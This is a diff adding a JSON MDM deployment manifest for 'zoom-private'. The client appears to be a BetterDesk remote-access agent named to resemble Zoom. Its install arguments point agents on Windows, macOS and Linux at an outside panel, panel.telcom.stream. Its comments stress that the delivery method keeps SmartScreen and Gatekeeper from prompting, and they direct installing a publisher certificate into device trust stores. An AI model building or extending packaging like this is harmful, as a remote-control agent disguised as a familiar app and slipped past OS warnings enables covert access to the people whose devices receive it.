@@ -1,0 +1,49 @@
+{
+  "$comment": "MDM allowlist manifest for the in-house zoom-private client. Import into your MDM (Intune / Jamf / Workspace ONE) so the client is deployed as a MANAGED app: files delivered by MDM carry no Mark-of-the-Web (Windows) and no com.apple.quarantine flag (macOS), so SmartScreen and Gatekeeper do not prompt.",
+  "product": "zoom-private",
+  "publisher": {
+    "name": "BetterDesk in-house",
+    "certificate_file": "publisher.cer",
+    "note": "Deploy this public certificate to the device trust stores using the scripts in this folder. The private key never leaves the build host."
+  },
+  "bundles": {
+    "windows": {
+      "asset": "zoom-private-windows-x64.zip",
+      "install_dir": "%LOCALAPPDATA%\\Programs\\zoom-private",
+      "config_dir": "%LOCALAPPDATA%\\zoom-private\\agent",
+      "installer": "install.ps1",
+      "install_args": "-ServerAddress https://panel.telcom.stream",
+      "detection": {
+        "type": "windows-win32-app",
+        "product_id": "zoom-private",
+        "binary": "zoom-private.agent.exe"
+      }
+    },
+    "macos": {
+      "asset": "zoom-private-macos-universal.zip",
+      "install_dir": "/Applications/zoom-private.agent.app",
+      "config_dir": "$HOME/Library/Application Support/zoom-private/agent",
+      "installer": "install.sh",
+      "install_args": "https://panel.telcom.stream",
+      "detection": {
+        "type": "macos-pkg",
+        "bundle_id": "com.betterdesk.agent"
+      }
+    },
+    "linux": {
+      "asset": "zoom-private-linux-x64.zip",
+      "install_dir": "/opt/zoom-private",
+      "config_dir": "$HOME/.config/zoom-private/agent",
+      "installer": "install.sh",
+      "install_args": "https://panel.telcom.stream",
+      "detection": {
+        "type": "linux-deb",
+        "binary": "zoom-private.agent"
+      }
+    }
+  },
+  "checksums": {
+    "$comment": "SHA-256 of the published bundles. Regenerate with scripts/trust/mdm/update-checksums.ps1 after each release.",
+    "file": "checksums.sha256"
+  }
+}
